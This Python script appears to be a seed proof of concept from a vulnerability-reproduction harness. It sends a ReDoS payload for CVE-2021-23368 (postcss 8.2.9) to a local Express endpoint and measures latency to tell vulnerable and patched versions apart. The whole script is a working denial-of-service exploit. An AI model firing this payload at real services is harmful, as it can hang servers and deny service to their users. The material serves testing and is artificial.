#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2021-23368 seed exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2021-23368 catastrophic-backtracking CSS to the REAL Express service (POST /process)
and measures the server-side response latency. The payload is a `/*# sourceMappingURL=` annotation
padded with a long whitespace run and NO closing `*/`; on postcss@8.2.9 the loadAnnotation regex
`/\\/\\*\\s*# sourceMappingURL=.*\\s*\\*\\//gm` has an ambiguous `.*` vs `\\s*` partition over the
space run, and because the required trailing `*/` never appears the engine backtracks catastrophically.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (8.2.9); FAST/bounded on V1 (8.2.10), because
CVE-2021-23368's fix removed the `\\s*` sub-pattern before `\\*/`, killing the whitespace-run ambiguity.

Usage: original_poc.py http://127.0.0.1:28209
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "a{}/*# sourceMappingURL=" + " " * 90000 + "!"   # len 90025
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"css": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/process", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28209"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2021-23368", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
